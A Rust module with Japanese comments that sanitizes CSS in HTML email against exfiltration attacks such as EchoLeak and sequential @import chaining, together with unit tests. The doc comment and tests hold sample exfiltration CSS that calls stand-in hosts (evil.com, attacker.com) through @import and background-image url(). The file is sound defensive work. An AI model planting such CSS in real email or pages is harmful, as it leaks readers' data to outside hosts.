//! CSS 外部リソース参照の除去 (exfiltration 防止)。
//!
//! # 脅威: EchoLeak (CVE-2025-32711) / CSS Blind Exfiltration
//!
//! HTML メール中の CSS が `@import url("https://evil.com/?v=...")` や
//! `background-image: url(https://attacker.com/track?data=...)` を含む場合、
//! メール表示時に自動 HTTP リクエストが発生し、機密情報を外部送信できる。
//!
//! Sequential Import Chaining (SIC) では `@import` を連鎖させることで
//! JavaScript なしにメールコンテンツをバイト単位で抽出できる。
//!
//! # 防御
//!
//! - `@import` ルールを全削除
//! - `url(http://...)` / `url(https://...)` を `url(about:blank)` に置換
//! - `expression(...)` (IE legacy) を削除
//! - `-moz-binding:` / `behavior:` プロパティを削除
//!
//! # 設計方針
//!
//! 完全な CSS パーサーは使用せず、行単位 + 文字列検索で高速処理する。
//! 誤検知よりも見逃しを減らす (メールの安全性が最優先)。

/// CSS サニタイズ結果。
#[derive(Debug, PartialEq)]
pub struct CssSanitizeResult {
    /// サニタイズ後の CSS テキスト。
    pub sanitized: String,
    /// 除去または無効化されたルール数。
    pub removed_count: usize,
}

/// CSS テキストから外部リソース参照を除去する。
///
/// `style` 属性値または `<style>` ブロック内のテキストに適用する。
#[must_use]
pub fn sanitize_css(css: &str) -> CssSanitizeResult {
    let mut removed_count = 0;
    let result: Vec<&str> = css.lines()
        .filter(|line| {
            let trimmed = line.trim_start();
            let lower = trimmed.to_ascii_lowercase();
            // @import ルールを完全に除去
            if lower.starts_with("@import") {
                removed_count += 1;
                return false;
            }
            // expression() (IE) を含む行を除去
            if lower.contains("expression(") {
                removed_count += 1;
                return false;
            }
            // -moz-binding / behavior: プロパティを除去
            if lower.contains("-moz-binding") || lower.starts_with("behavior") {
                removed_count += 1;
                return false;
            }
            true
        })
        .collect();

    // url(http://...) および url(https://...) を url(about:blank) に置換
    let joined = result.join("\n");
    let (sanitized, url_removed) = rewrite_external_urls(&joined);
    removed_count += url_removed;

    CssSanitizeResult { sanitized, removed_count }
}

/// HTML の `style` 属性からも外部参照を除去する (インライン CSS 用)。
#[must_use]
pub fn sanitize_style_attribute(value: &str) -> (String, bool) {
    let lower = value.to_ascii_lowercase();
    // expression() チェック
    if lower.contains("expression(") || lower.contains("-moz-binding") || lower.contains("behavior") {
        return (String::new(), true);
    }
    let (rewritten, count) = rewrite_external_urls(value);
    (rewritten, count > 0)
}

/// `url(http://...)` / `url(https://...)` を `url(about:blank)` に置換する。
///
/// 大文字小文字を無視し、シングル/ダブルクォートあり/なしを全パターン対応。
/// 戻り値: (置換後文字列, 置換件数)
fn rewrite_external_urls(css: &str) -> (String, usize) {
    let mut result = String::with_capacity(css.len());
    let mut count = 0;
    let bytes = css.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        // "url" を大文字小文字無視で探す
        if i + 3 <= bytes.len()
            && bytes[i].eq_ignore_ascii_case(&b'u')
            && bytes[i + 1].eq_ignore_ascii_case(&b'r')
            && bytes[i + 2].eq_ignore_ascii_case(&b'l')
        {
            // "url" に続く '(' を探す (空白可)
            let mut j = i + 3;
            while j < bytes.len() && bytes[j] == b' ' { j += 1; }
            if j < bytes.len() && bytes[j] == b'(' {
                // 括弧内を抽出
                let start = j + 1;
                if let Some(end) = css[start..].find(')') {
                    let inner = css[start..start + end].trim().trim_matches(|c| c == '\'' || c == '"');
                    let inner_lower = inner.to_ascii_lowercase();
                    if inner_lower.starts_with("http://") || inner_lower.starts_with("https://") {
                        result.push_str("url(about:blank)");
                        i = start + end + 1;
                        count += 1;
                        continue;
                    }
                }
            }
        }
        // 通常文字をそのままコピー
        if let Some(ch) = css[i..].chars().next() {
            result.push(ch);
            i += ch.len_utf8();
        } else {
            i += 1;
        }
    }

    (result, count)
}

// ============================================================================
// テスト
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn import_rule_removed() {
        let css = "@import url('https://evil.com/steal?v=abc');\nbody { color: red; }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"), "@import は除去されるべき");
        assert!(result.sanitized.contains("color: red"), "無害なルールは保持されるべき");
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn import_without_quotes_removed() {
        let css = "@import url(https://evil.com/track);";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"));
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn background_image_external_url_rewritten() {
        let css = "body { background-image: url(https://tracker.evil.com/pixel); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("tracker.evil.com"), "外部URLは書き換えられるべき");
        assert!(result.sanitized.contains("about:blank"), "about:blank に置換されるべき");
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn data_url_preserved() {
        let css = "body { background-image: url(data:image/png;base64,abc123); }";
        let result = sanitize_css(css);
        assert!(result.sanitized.contains("data:image/png"), "data: URL は保持されるべき");
        assert_eq!(result.removed_count, 0);
    }

    #[test]
    fn expression_removed() {
        let css = "body { width: expression(document.body.scrollWidth); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("expression("), "expression() は除去されるべき");
    }

    #[test]
    fn moz_binding_removed() {
        let css = "body { -moz-binding: url('chrome://foo/bar.xml#foo'); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("-moz-binding"), "-moz-binding は除去されるべき");
    }

    #[test]
    fn clean_css_unchanged() {
        let css = "body { color: #333; font-size: 16px; } h1 { font-weight: bold; }";
        let result = sanitize_css(css);
        assert_eq!(result.removed_count, 0);
        assert!(result.sanitized.contains("color: #333"));
    }

    #[test]
    fn http_url_also_rewritten() {
        let css = "div { background: url(http://evil.com/track); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"));
        assert!(result.sanitized.contains("about:blank"));
    }

    #[test]
    fn multiple_imports_all_removed() {
        let css = "@import url('https://a.evil.com/');\n@import url('https://b.evil.com/');\np { color: blue; }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"));
        assert_eq!(result.removed_count, 2);
        assert!(result.sanitized.contains("color: blue"));
    }

    #[test]
    fn style_attribute_expression_blocked() {
        let (out, modified) = sanitize_style_attribute("width: expression(alert(1))");
        assert!(modified, "expression() を含む属性は変更されるべき");
        assert!(out.is_empty(), "expression() を含む属性は空になるべき");
    }

    #[test]
    fn style_attribute_clean_preserved() {
        let (out, modified) = sanitize_style_attribute("color: red; font-size: 14px;");
        assert!(!modified, "クリーンな属性は変更しない");
        assert_eq!(out, "color: red; font-size: 14px;");
    }

    #[test]
    fn url_case_insensitive_rewritten() {
        // URL() 大文字
        let css = "div { background: URL(HTTPS://evil.com/img.png); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"));
    }
}
